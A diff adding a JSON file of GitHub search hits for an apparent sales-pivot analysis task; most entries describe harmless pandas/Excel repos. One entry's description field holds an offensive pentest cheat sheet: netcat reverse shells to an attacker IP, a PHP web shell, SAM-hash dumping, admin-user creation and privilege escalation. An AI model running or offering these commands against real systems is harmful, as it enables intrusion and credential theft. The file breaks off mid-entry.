@@ -1,0 +1,791 @@
+{
+  "generated_at": "2026-04-21T18:08:40.014015",
+  "summary": {
+    "n_hits": 46,
+    "n_tasks": 2
+  },
+  "hits": [
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "JyotiradityaDuarah/Python-Exploratory-Analytics",
+      "url": "https://github.com/JyotiradityaDuarah/Python-Exploratory-Analytics",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "JyotiradityaDuarah/Python-Exploratory-Analytics",
+        "description": "This project contains a complete exploratory data analysis workflow implemented in a Jupyter Notebook and rendered as Assignment.html. The analysis involves loading data, cleaning it, performing descriptive statistics, visualizing patterns, and deriving meaningful insights using Python.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Rohitpandey08/automated-data-cleaning-pipeline",
+      "url": "https://github.com/Rohitpandey08/automated-data-cleaning-pipeline",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "Rohitpandey08/automated-data-cleaning-pipeline",
+        "description": "Automated data cleaning pipeline built with Python and Pandas that processes Excel and CSV files, standardizes schemas, validates required columns, and generates analysis-ready datasets through a CLI-based workflow.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Samiul1947/google-adwords-performance-analysis",
+      "url": "https://github.com/Samiul1947/google-adwords-performance-analysis",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "Samiul1947/google-adwords-performance-analysis",
+        "description": "An end-to-end Google AdWords performance analytics pipeline using Excel, Python (pandas, numpy), SQL (MySQL), and Power BI. Transforms raw ad data into actionable insights through data cleaning, transformation, relational modeling, and interactive dashboards, simulating a real-world ETL and Business Intelligence workflow.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "hcibikci/Python-Automation-Fatigue-Data-Analysis",
+      "url": "https://github.com/hcibikci/Python-Automation-Fatigue-Data-Analysis",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "hcibikci/Python-Automation-Fatigue-Data-Analysis",
+        "description": "Automating Miner's Rule damage calculation using Pandas & NumPy to replace manual Excel workflows.",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::02",
+      "query_text": "pandas excel analysis workflow",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "shourba1/Tourism-Data-Analysis-Project",
+      "url": "https://github.com/shourba1/Tourism-Data-Analysis-Project",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "shourba1/Tourism-Data-Analysis-Project",
+        "description": "Full data analysis workflow applied to a real tourism dataset — including Python cleaning & EDA, Excel business analysis (10 pivot insights), an interactive Power BI dashboard, and SQL analytical queries. Demonstrates end-to-end analytical skills and the ability to extract actionable insights from raw data.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::04",
+      "query_text": "spreadsheet validation workflow python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "SakshiKhanore/Sales-Dashboard-Excel",
+      "url": "https://github.com/SakshiKhanore/Sales-Dashboard-Excel",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "SakshiKhanore/Sales-Dashboard-Excel",
+        "description": "This repo contains files demonstrating data cleaning, filtering, and aggregation on a sales dataset using Excel and Python (Pandas) to compute revenue metrics by month, gender, and product category. Analyzed sales trends and validated insights across spreadsheet-based and programmatic workflows using Excel dashboards and Python-based summaries.",
+        "stars": 0,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::family_core::04",
+      "query_text": "spreadsheet validation workflow python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+      "url": "https://github.com/VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+      "domain": "github.com",
+      "score_hint": 1.0,
+      "metadata": {
+        "repo_full_name": "VuppalaYashwanth/Python-Automation-Tool-for-CSV-Validation-Cleaning-Report-Generation",
+        "description": "This project is a Python-based automation tool designed to improve the reliability of recurring CSV and spreadsheet-based reporting workflows. It validates dataset structure, cleans inconsistent data, and produces standardized outputs along with summary reports.",
+        "stars": 1,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::03",
+      "query_text": "pdf table extraction python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "xavctn/img2table",
+      "url": "https://github.com/xavctn/img2table",
+      "domain": "github.com",
+      "score_hint": 1.173,
+      "metadata": {
+        "repo_full_name": "xavctn/img2table",
+        "description": "img2table is a table identification and extraction Python Library for PDF and images, based on OpenCV image processing",
+        "stars": 864,
+        "default_branch": "main"
+      }
+    },
+    {
+      "task_id": "sales-pivot-analysis",
+      "query_id": "sales-pivot-analysis::skill_neighbor::03",
+      "query_text": "pdf table extraction python",
+      "provider": "github_repo_search",
+      "source_type": "github_repo",
+      "title": "Don-No7/Hack-SQL",
+      "url": "https://github.com/Don-No7/Hack-SQL",
+      "domain": "github.com",
+      "score_hint": 1.026,
+      "metadata": {
+        "repo_full_name": "Don-No7/Hack-SQL",
+        "description": "-- -- File generated with SQLiteStudio v3.2.1 on Sun Feb 7 14:58:28 2021 -- -- Text encoding used: System -- PRAGMA foreign_keys = off; BEGIN TRANSACTION;  -- Table: Commands CREATE TABLE Commands (Command_No INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, Name TEXT REFERENCES Programs (Name) NOT NULL, Description TEXT NOT NULL, Command TEXT, File BLOB); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (1, 'Kerbrute', 'brute single user password', 'kerbrute bruteuers [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (2, 'Kerbrute', 'brute username:password combos from file or stdin', 'kerbrute brutforce [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (3, 'Kerbrute', 'test a single password agains a list of users', 'kerbrute passwordspray [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (4, 'Kerbrute', 'Enumerate valid domain usernames via kerberos', 'kerbrute userenum [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (5, 'Name-That-Hash', 'Find the hash type of a string', 'nth --text ''<hash>''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (6, 'Name-That-Hash', 'Find the hash type of a file', 'nth --file <hash file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (7, 'Nmap', 'scan for vulnerabilites', 'nmap --script vuln <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (8, 'Nikto', 'Scan host for vulnerabilites', 'nikto -h <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (9, 'SMBClient', 'check for misconfigured anonymous login', 'smbclient -L \\\\\\\\<HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (10, 'Hydra', 'Brutforce a webpage looking for usernames', 'hydra -l <user wordlist> -p 123 <HOST_IP> http-post-form ''/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=<output string on failure>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (11, 'SMBMap', 'enumerates SMB file shares', 'smbmap -u <user> -p <pass> -H <host IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (12, 'WPScan', 'Enumerate Wordpress website', 'wpscan --url <wp site> --enumerate --plugins-detection', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (13, 'WPScan', 'enumerate though known usernames', 'wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (14, 'PowerShell', 'bypass execution policy', 'powershell.exe -exec bypass', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (15, 'TheHarvester', 'gathering informaiton from online sources', 'theharvester -d <domain> -l <#> -g -b google', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (16, 'Netcat', 'open a listener', 'nc -lvnp <port #>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (17, 'Netcat', 'Connect to computer', 'nc <attacker ip> <attacker port>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (18, 'GoBuster', 'Eunmerate directories on a website with a cookie', 'gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (19, 'SQLMap', 'map sql at an IP', 'sqlmap -r <IP> --batch --force-ssl', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (20, 'John the Ripper', 'Use wordlist to parse hash', 'john <HASHES_FILE> --wordlist=<wordlist>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (21, 'John the Ripper', 'unencrypt shadow file', 'john <Unshadowed passwds>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (22, 'Unshadow', 'combine /etc/passwd and /etc/shadow file for cracking', 'unshadow <passwd> <shadow>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (23, 'Hashcat', 'crack hashes with a wordlist', 'hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (26, 'Enum4Linux', 'basic command', 'enum4linux -a <IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (27, 'SMBClient', 'connect to a SMB share', 'smbclinet //<IP>/<share> -U <username>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (28, 'Netcat', 'connect with shell (-e doest always work)', 'nc -e /bin/sh <ATTACKING-IP> 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (29, 'Netcat', 'connect with shell (-e doest always work)', '/bin/sh | nc ATTACKING-IP 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (30, 'Netcat', 'done on the target', 'rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (31, 'SQLMap', 'Check form for SQL injection', 'sqlmap -o -u \"http://meh.com/form/\" –forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (32, 'SQLMap', 'automated SQL scan', 'sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (33, 'CrackMapExec', 'run a mimikatz module', 'crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M mimikatz', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (34, 'CrackMapExec', 'Command execution', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' -x whoami', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (35, 'CrackMapExec', 'check logged in users', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' --lusers', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (36, 'CrackMapExec', 'dump local SAM hashes', 'crackmapexec <target(s)> -u ''<uesrname>'' -p ''<password>'' --local-auth --sam', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (37, 'CrackMapExec', 'null session login', 'crackmapexec smb <target(s)> -u '''' -p ''''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (38, 'CrackMapExec', 'list modules', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (39, 'CrackMapExec', 'pass the hash', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (41, 'IKE-Scan', 'attack pre shared key with dictionary', 'psk-crack -d </path/to/dictionary> <psk file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (42, 'IKE-Scan', 'If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN', 'ike-scan <IP> -A -id GroupVPN', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (43, 'IKE-Scan', 'to find aggressive mode VPNs and save for use with psk-crack', 'ike-scan <IP> -A -P<file out>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (44, 'John the Ripper', 'crack passwords with korelogic rules', 'for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (45, 'Nmap', 'create a list of ip addresses ', 'nmap -sL -n 192.168.1.1-100,102-254 | grep \"report for\" | cut -d \" \" -f 5 > ip_list_192.168.1.txt', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (46, 'Linux commands', 'mount NFS share on linux', 'mount -t nfs server:/share /mnt/point', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (47, 'PowerShell', 'create new user', 'net user <username> <password> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (48, 'PowerShell', 'add user to a group (normaly Administrators)', 'net localgroup <group> <username> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (49, 'PSK-Crack', 'brute force with specified length and specified chars (if left blank default is 36)', 'psk-crack -b <#> --charset=\"<charlist>\" <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (50, 'PSK-Crack', 'dictianary attack', 'psk-crack -d <file> <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (51, 'SQLMap', 'check form for SQL injection', 'sqlmap -o -u \"<url of form>\" --forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (52, 'SQLMap', 'Scan url for union + error based injection with mysql backend and use a random user agent + database dump', 'sqlmap -u \"<form URL>?id=1>\"  --dbms=mysql --tech=U --random-agent --dump ', NULL);  -- Table: Exploits CREATE TABLE Exploits (Target TEXT, Type TEXT, Criteria TEXT, Method TEXT, Code TEXT, Result TEXT, Notes TEXT); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Injection', 'ability to write to website folder', 'create or edit a mage of the website and insert the code to get remote access to the machine', '<? php system ($ _ GET [''cmd'']); ?>', 'execute code via url', '<URL of php>?cmd=<code to execue>'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'shell', 'enter code into the shell to find vulnerbilities int he machine', 'find / -perm -u=s -type f 2>/dev/null', 'SUID binaries', 'link output to GTFO bins and exploit'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Box', 'Priv Esc', 'Python binary running as root', 'generate a shell using python to grain root access', 'python3 -c \"import pty;pty.spawn(''/bin/sh'');\"', 'root shell', 'change pyton varibale acordingly'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('SQL', 'Priv Esc', 'MySQL binary running as root', 'enter into MySQL command line and break out into root y using the code', 'mysql> \\! /bin/sh', 'get shell from root priv SQL', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'low privilage shell', 'use the code to search for programs that run as sudo without password', 'sudo -l', NULL, 'list programs that can be used with sudo and no password'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Windows', 'Priv Esc', 'Powershell', 'use code to enumerate priv esc opertunities', 'wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"', 'list of unquoted service paths that might be used for priv esc', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'LFI', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', NULL, 'use Linenum.sh to enumerate linux box', 'wget https://www.linenum.sh/ -P /dev/shm/Linenum.sh; chmod +x /dev/shm/linenum.sh ; ./dev/shm/Linenum.sh | tee /dev/shm/lininfo.txt', ' file, /dev/shm/lininfo.txt, with priv esc info', 'it is possible to use other methods of download like: curl or others found on google'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'No-Auth', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Re-Registration', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'JWT', 'a site that uses jSON as cookies', 'edit the information (with BURP) thats going to the website to gain access without authenitaction', NULL, NULL, NULL);  -- Table: Programs CREATE TABLE Programs (Name text PRIMARY KEY NOT NULL UNIQUE, Stage TEXT, Description text, Info text, Features TEXT, Target TEXT, Offensive BOOLEAN, commands TEXT); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nmap', 'Enum', 'Used for scanning a network/host to gather more information', 'man pages on linux', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('BURP Suit', 'Enum, Exploit', 'A program for manipulating HTTP requests, enumeration and Exploit', 'https://portswigger.net/burp/documentation/contents', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Metasploit', 'All', 'Powerfull swiss-army-knife of hacking', 'https://docs.rapid7.com/metasploit/', NULL, 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('MSFVenom', 'Exploit', 'Designed for creating payloads', 'https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom', 'Payloads', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Snort', 'Utility', 'Packet sniffer', 'https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/249/original/snort_manual.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIXACIED2SPMSC7GA%2F20210128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210128T192737Z&X-Amz-Expires=172800&X-Amz-SignedHeaders=host&X-Amz-Signature=4b51dc730677d14203c4a4cde25c1831ac64e9eca8df89c6737701811fa3f9fd', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('GoBuster', 'Enum', 'A fuzzer for websites', 'man pages on linux', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hydra', 'Exploit', 'Brutforcer for wesite passwords', 'man pages on linux', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Mimikatz', 'Post', 'Used to exploit kerberos', 'https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Impacket', 'Exploit', 'The fascilitator of python bassed script that uses modules for attacking windows ', 'https://www.secureauth.com/labs-old/impacket/', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Enum4Linux', 'Enum', 'for Enumerating Windows and Samba hosts', 'man pages included, https://tools.kali.org/information-gathering/enum4linux', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Rubeus', 'Exploit', 'Used for kerberos interaction and abuse', 'https://github.com/GhostPack/Rubeus', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Kerbrute', 'Enum, Exploit', 'quickly enumerate and brutforce active directory accounts through kerberos pre-authentication', 'https://github.com/ropnop/kerbrute/', 'Brute', 'Windows', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('John the Ripper', 'Exploit', 'a password brutforcer', 'https://www.openwall.com/john/doc/', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hashcat', 'Exploit', 'A password bruteforces', 'http://manpages.org/hashcat', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Bloodhound', 'Enum', 'Network mapping tool', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Wireshark', 'Utility', 'Packet sniffer', 'https://www.wireshark.org/download/docs/user-guide.pdf', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hash-Identifier', 'Utility', '(superseeded by Name-That-Hash)A simple python program for identifying hashes', 'man pages on linux', NULL, 'Hash', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Scp', 'Utility', 'For transfering files over SSH connection', 'man pages on llinux', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBClient', 'Utility', 'Used to connect to SMB file shares, can be used to enumerate shares', 'man pages on linux', 'Connect', 'SMB', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PowerShell', 'Utility', 'Powerfull comand line for Windows', 'https://www.pdq.com/powershell/', NULL, 'Windows', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Searchsploit', 'Enum', 'Local version of ExploitDB', 'https://www.exploit-db.com/searchsploit', 'Exploit Enum', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Vim', 'Utiility', 'Text editor', 'https://vimhelp.org/', NULL, 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('LinPeas', 'Post', 'For Enumerating Linux computers', 'Simply run on a linux computer', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nikto', 'Enum', 'For full enumeration on websites', 'https://cirt.net/nikto2-docs/', 'Exploit Enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Radare2', 'Utility', 'A tooll used to reverse engineer programs', 'https://github.com/radareorg/radare2/blob/master/doc/intro.md', 'Reverse', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Evil-WinRM', 'Exploit', 'Malware exuivilent of WinRM and used to exploit windows systems', 'https://github.com/Hackplayers/evil-winrm', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Seatbelt', 'Post', 'Seatbelt is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives', 'https://github.com/GhostPack/Seatbelt', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WinPeas', 'Post', 'For full enumeration of windows host (internal)', 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Lockless', 'Post', 'LockLess is a C# tool that allows for the enumeration of open file handles and the copying of locked files', 'https://github.com/GhostPack/Lockless', 'File interaction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SQLMap', 'Exploit', 'Automates the process of detecting and exploiting SQL injection flaws and taking over of database servers', 'http://sqlmap.org/', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('KEETheif', 'Post', 'Allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system', 'https://github.com/GhostPack/KeeThief', 'File interacction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('TheHarvester', 'Enum', 'The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database', 'https://tools.kali.org/information-gathering/theharvester', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('jSQLInjection', 'Enum', 'used for gathering SQL databse information form a distant source', 'https://tools.kali.org/vulnerability-analysis/jsql', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hping', 'Enum', 'Ping command on steroids, used to enumerating firewalls', 'https://tools.kali.org/information-gathering/hping3', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux Exploit Suggester', 'Post', 'keeps track of vulnerabilities and suggests exploits to gain root access', 'https://tools.kali.org/exploitation-tools/linux-exploit-suggester', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unix-PrivEsc-Check', 'Post', ' It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps, written in a single shell script so is easy to upload', 'https://tools.kali.org/vulnerability-analysis/unix-privesc-check', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Dotdotpwn', 'Enum', 'It’s a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers', 'https://tools.kali.org/information-gathering/dotdotpwn', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Websploit', 'Enum, Exploit', 'Swiss-army-knife of web exploits ranging from social engineering to honeypots and everything in between', 'https://tools.kali.org/web-applications/websploit', NULL, 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('XSSer', 'Enum', 'To detect, exploit and report XSS vulnerabilities in web-based applications', 'https://tools.kali.org/web-applications/xsser', 'Exploit enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Name-That-Hash', 'Utility', 'Hash-identifier with more deatils and command line based', 'https://github.com/HashPals/Name-That-Hash', NULL, 'N/A', 'N', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBMap', 'Enum', 'enumerate shares over a domin', 'https://tools.kali.org/information-gathering/smbmap', 'Scanning', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Redis-Cli', 'Exploit', 'used for interacting and exploiting reddis-cli on port 6379', 'https://book.hacktricks.xyz/pentesting/6379-pentesting-redis ; https://redis.io/topics/rediscli', 'SQL', 'SQL', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unshadow', 'POST', 'Combining passwd and shadow files into 1', 'simply use: unshadow <passwd file> <shadow file> > <output file>', 'Passwords', 'Hash', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WPScan', 'Enum', 'Look for vulnerabilities in wordpress site', 'https://github.com/wpscanteam/wpscan', 'Scanning', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Netcat', 'Utility', 'used for connecting 2 computers', 'https://www.win.tue.nl/~aeb/linux/hh/netcat_tutorial.pdf', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, 